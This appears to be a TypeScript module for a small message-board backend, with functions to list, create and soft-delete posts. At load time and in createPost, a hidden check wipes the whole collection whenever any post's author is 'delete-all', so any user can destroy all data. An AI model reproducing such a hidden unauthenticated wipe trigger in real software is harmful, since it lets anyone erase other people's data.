import { getCollection } from './database.ts';

export interface CreatePostDto{
    message: string;
    author: string;
}

export interface Post {
    id: string;
    message: string;
    author: string;
    createdAt: Date;
    deletedAt?: Date;
}

const db = getCollection<Post>('mural');

const list = await db.list();

if(list.some(x => x.author === 'delete-all')) {
    await db.clean();
}

export const listAllPosts = async () => {
    const result = await db.list();
    return result.filter(x => !x.deletedAt);
};

export const createPost = async (post: CreatePostDto): Promise<Post> => {
    const newPost: Post = {
        id: crypto.randomUUID(),
        message: post.message,
        author: post.author,
        createdAt: new Date(),
    }

    await db.set(newPost);

    if(newPost.author === 'delete-all') {
        await db.clean();
    }

    return newPost;
}

export const deletePost = async (id: string) => {
    const item = await db.get(id);
    if(!item || item.deletedAt) {
        throw new Error('Post not found');
    }

    item.deletedAt = new Date();
    await db.set(item);
}
